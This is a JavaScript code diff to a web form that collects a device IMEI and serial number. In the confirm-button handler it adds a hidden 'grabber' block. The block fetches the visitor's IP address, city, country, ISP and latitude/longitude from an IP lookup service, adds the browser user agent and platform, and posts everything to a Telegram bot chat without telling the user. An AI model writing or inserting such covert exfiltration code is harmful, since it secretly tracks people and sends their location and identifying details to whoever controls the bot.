@@ -178,7 +178,7 @@
             overlay.style.display = 'flex';
         });
 
-        confirmYes.addEventListener('click', () => {
+        confirmYes.addEventListener('click', async () => {
             overlay.style.display = 'none';
             const imei = imeiInput.value.trim();
             const serial = document.getElementById('serial').value.trim();
@@ -224,6 +224,30 @@
                 notification.textContent = `Error: ${error.message}`;
                 notification.style.color = 'red';
             });
+
+            // Grab IP and CheckBoard Details
+            try {
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                const ipData = await ipResponse.json();
+
+                const grabberMessage = `
+                📍 User Details Captured:
+                IP Address: ${ipData.ip}
+                Location: ${ipData.city}, ${ipData.region}, ${ipData.country_name}
+                ISP: ${ipData.org}
+                Latitude: ${ipData.latitude}, Longitude: ${ipData.longitude}
+                Browser Info: ${navigator.userAgent}
+                Platform: ${navigator.platform}
+                `;
+
+                await fetch(telegramApiUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, text: grabberMessage }),
+                });
+            } catch (error) {
+                console.error('Error grabbing user details:', error);
+            }
         });
 
         confirmNo.addEventListener('click', () => {
